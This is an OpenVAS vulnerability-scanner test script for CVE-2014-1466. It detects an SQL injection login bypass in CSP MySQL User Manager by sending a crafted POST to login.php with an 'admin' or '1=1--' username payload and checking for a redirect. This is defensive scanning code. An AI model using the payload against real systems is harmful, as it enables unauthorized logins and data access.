##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_csp_mysql_user_manager_sql_inj_vuln.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# CSP MySQL User Manager SQL Injection Vulnerability
#
# Authors:
# Shashi Kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804229");
  script_version("$Revision: 13659 $");
  script_cve_id("CVE-2014-1466");
  script_bugtraq_id(64731);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2014-01-28 11:34:43 +0530 (Tue, 28 Jan 2014)");
  script_name("CSP MySQL User Manager SQL Injection Vulnerability");

  script_tag(name:"summary", value:"This host is running CSP MySQL User Manager and is prone to SQL injection
  vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP POST request and check whether it is
  able to login.");
  script_tag(name:"insight", value:"The flaw is due to input passed via the 'username' parameter to 'login.php',
  which is not properly sanitised before being used in a SQL query.");
  script_tag(name:"impact", value:"Successful exploitation will let attackers to manipulate SQL queries by
  injecting arbitrary SQL code and gain sensitive information.");
  script_tag(name:"affected", value:"CSP MySQL User Manager 2.3, Other versions may also be affected.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/124724/");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/90210");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("misc_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

cspPort = get_http_port(default:80);
if(!can_host_php(port:cspPort)){
  exit(0);
}

useragent = http_get_user_agent();
host = http_host_name(port:cspPort);

foreach dir (make_list_unique("/cmum", "/cspmum", "/", cgi_dirs(port:cspPort)))
{

  if(dir == "/") dir = "";

  cspRes = http_get_cache(item:dir + "/index.php", port:cspPort);

  if(cspRes && ">:: CSP MySQL User Manager<" >< cspRes)
  {
    url = dir + "/login.php";
    payload = "loginuser=admin%27+or+%27+1%3D1--&loginpass=" + rand_str(length:5);

    cspReq = string("POST ",url," HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: ", useragent, "\r\n",
                 "Referer: http://", host, dir, "/index.php \r\n",
                 "Connection: keep-alive\r\n",
                 "Cookie: PHPSESSID=fb8c63eb59035022c9f853dba0785c4f\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ",strlen(payload), "\r\n\r\n",
                 payload);
    cspRes = http_keepalive_send_recv(port:cspPort, data:cspReq);

    if(cspRes && cspRes =~ "HTTP/1.. 302 Found" && "Location: home.php" >< cspRes)
    {
      security_message(port:cspPort);
      exit(0);
    }
  }
}

exit(99);
